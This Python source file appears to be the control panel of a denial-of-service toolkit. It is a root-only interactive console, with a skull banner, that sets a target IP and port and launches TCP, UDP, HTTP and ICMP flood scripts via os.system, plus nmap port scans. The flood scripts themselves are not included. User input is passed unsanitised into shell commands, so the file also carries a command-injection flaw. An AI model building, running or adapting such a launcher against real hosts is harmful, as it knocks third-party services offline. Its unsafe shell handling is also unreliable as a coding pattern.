#!/usr/bin/env python3
import sys,os,subprocess,pathlib

root=subprocess.check_output(["id"])



if sys.platform  == "win32":
    print("[-] You need a linux machine :(")
    exit()

os.system("clear")

if not "root" in root.decode():
    print("[-] Need root")
    exit()

try:
    from colored import fg
except:
    print("[!] Please run install.sh if you don't know pls read the README.md")
    exit()








g = fg("green")
r = fg("red")
c = fg("cyan")
w = fg(255)


print("""     
                   ...
                 ;::::;              
               ;::::; :;
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO
           ::::::;       ;          OOOOO
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#

! type help for help !

""")

def usage():
    print(f"""
    
    *****
    ::OPTIONS::

    use udp/tcp/icmp/http
    
    ## HTTP/TCP/UDP ##
    $set ip 1.1.1.1
    $set port 80
    ## HTTP/TCP/UDP ##

    ## ICMP ##
    $set ip 1.1.1.1
    ## ICMP ##

    $run$

    _________________

    use pscanner

    ## example ##
    $use pscanner
    $set ip 1.1.1.1
    $set port 80
    {r}$ps: You can scan multi ports -> set port 80-100
    $ / this code will scan between 80 and 100 [80 and 100 included] / nmap

    {w}
    ::OPTIONS::
    *****

    """)


path = pathlib.Path(__file__).parent.resolve()
convert = str(path).split("/main")
convert2 = convert[0]
cpath = str(convert2) + "/scripts"


try:
    while True:

        mainq = input(c + "Panel" + g +"~$ "+w ).lower()
        if mainq == "help":
            usage()
        elif mainq == "clear":
            os.system("clear")
        elif mainq == "exit" or mainq == "quit":
            print(r + "[!] Exited Successfully")
            exit()
        elif mainq == "use tcp":
            ppath = str(cpath) + "/tcp.py"
            while True:
                mainq = input(c + "Panel"+r+"~/tcp"+g+"$ "+w).lower()
                if mainq == "back":
                    break
                    
                elif mainq == "exit" or mainq == "quit":
                    print(r + "[!] Exited Successfully")
                    exit()

                elif "set ip" in mainq:
                    convert = mainq.split("set ip")
                    ip = convert[1]
                    print(c + "[*] IP -->> "+g+str(ip))


                elif "set port" in mainq:
                    convert =  mainq.split("set port")
                    port = convert[1]
                    print(c +"[*] PORT -->> "+g+str(port))
                
                elif mainq == "clear":
                    os.system("clear")
                
                elif mainq == "run":
                    
                    if ip is None:
                        print(r+"[-]"+w+ "ip is None")
                        exit()
                    if port is None:
                        print("[*] Port is None / default : 80")
                        port = 80

                    print(g + f"[+] Launching Attack - {ip} | {str(port)} ")
                    
                    os.system(f"python3 {ppath} {ip} {int(port)}")
                    
        elif mainq == "use udp":
            ppath = str(cpath) + "/udp.pl"
            while True:
                mainq = input(c + "Panel"+r+"~/udp"+g+"$ "+w).lower()   
                if mainq == "back":
                    break
                elif mainq == "exit" or mainq == "quit":
                    print(r + "[!] Exited Successfully")
                    exit()
                    
                elif "set ip" in mainq:
                    convert = mainq.split("set ip")
                    ip = convert[1]
                    print(c + "[*] IP -->> "+g+str(ip))

                elif mainq == "clear":
                    os.system("clear")

                elif "set port" in mainq:
                    convert = mainq.split("set port")
                    port = convert[1]
                    print(c +"[*] PORT -->> "+g+str(port))
                
                elif "set byte" in mainq:
                    convert = mainq.split("set byte")
                    byte = convert[1]
                    print(c+"[*] BYTE -->> "+g+str(byte))


                if mainq == "run":
                    if ip is None:
                        print("[-] ip can't be None")
                        exit()
                    if port is None:
                        print("[*] Port is None / default : 80")
                        port = 80
                    if byte is None:
                        print("[*] Byte is None / default : 8000")
                        byte = 8000


                    print(g + f"[+] Launching Attack - {ip} | {str(port)} | {str(byte)} ")

                    
                    os.system(f"perl {ppath} {ip} {str(port)} {str(byte)} 9999999999999999999999999999999999999999999999999")

                    
        elif mainq == "use http":
            ppath = str(cpath) + "/http.py"
            while True:
                mainq = input(c + "Panel"+r+"~/http"+g+"$ "+w).lower()
                
                if mainq == "back":
                    break
                    
                elif mainq == "exit" or mainq == "quit":
                    print(r + "[!] Exited Successfully")
                    exit()
                elif "set ip" in mainq:
                    convert = mainq.split("set ip")
                    ip = convert[1]
                    print(c + "[*] IP -->> "+g+str(ip))

                elif mainq == "clear":
                    os.system("clear")


                elif "set port" in mainq:
                    convert = mainq.split("set port")
                    port = convert[1]
                    print(c +"[*] PORT -->> "+g+str(port))
                if mainq == "run":
                    if ip is None:
                        print("[-] ip is None")
                        exit()
                    if port is None:
                        print("[*] Port is None / default : 80")
                        port = 80

                    print(g + f"[+] Launching Attack - {ip} | {str(port)} ")
                    
                    os.system(f"python3 {ppath} {ip} {int(port)}")
                    
        elif mainq == "use icmp":
            ppath = str(cpath) + "/icmp.py"
            while True:
                mainq = input(c + "Panel"+r+"~/icmp"+g+"$ "+w).lower()
                if mainq == "back":
                    break
                elif mainq == "exit" or mainq == "quit":
                    print(r + "[!] Exited Successfully")
                    exit()
                elif "set ip" in mainq:
                    convert = mainq.split("set ip")
                    ip = convert[1]
                    print(c + "[*] IP -->> "+g+str(ip))

                elif mainq == "clear":
                    os.system("clear")


                elif "set port" in mainq:
                    convert = mainq.split("set port")
                    port = convert[1]
                    print(c +"[*] PORT -->> "+g+str(port))
                if mainq == "run":
                    if ip is None:
                        print("[-] ip is None")
                        exit()
                    if port is None:
                        print("[*] Port is None / default : 80")
                        port = 80

                    print(g + f"[+] Launching Attack - {ip} | {str(port)} ")
                    
                    os.system(f"python3 {ppath} {ip} {int(port)}")
                    

        elif mainq == "use pscanner":
            while True:
                mainq = input(c + "Panel"+r+"~/pscanner"+g+"$ "+w).lower()
                if mainq == "back":
                    break

                elif mainq == "exit" or mainq == "quit":
                    print(r + "[!] Exited Successfully")
                    exit()
                    
                elif "set ip" in mainq:
                    convert = mainq.split("set ip")
                    ip = convert[1]
                    print(c + "[*] IP -->> "+g+str(ip))

                elif mainq == "clear":
                    os.system("clear")


                elif "set port" in mainq:
                    convert = mainq.split("set port")
                    port = convert[1]
                    print(c +"[*] PORT -->> "+g+str(port))
                if mainq == "run":
                    try:
                        if ip is None:
                            print("[-] ip is None")
                            exit()
                        try:
                            if port is None:
                                print("[*] Port is None / default : allports")
                                port = None
                        except:
                            port = None
                            print(g + f"[+] Launching Attack - {ip} | None ")
                            os.system(f"nmap {str(ip)} ")
                            
                            
                        print(g + f"[+] Launching Attack - {ip} | {str(port)} ")
                        
                        os.system(f"nmap {ip} -p {str(port)}")
                        
                    except KeyboardInterrupt:
                        continue
        else:
            print(r+"[-]"+w+" Unknown Command : "+str(mainq))
except KeyboardInterrupt:
    print(r +"[-] Exiting")
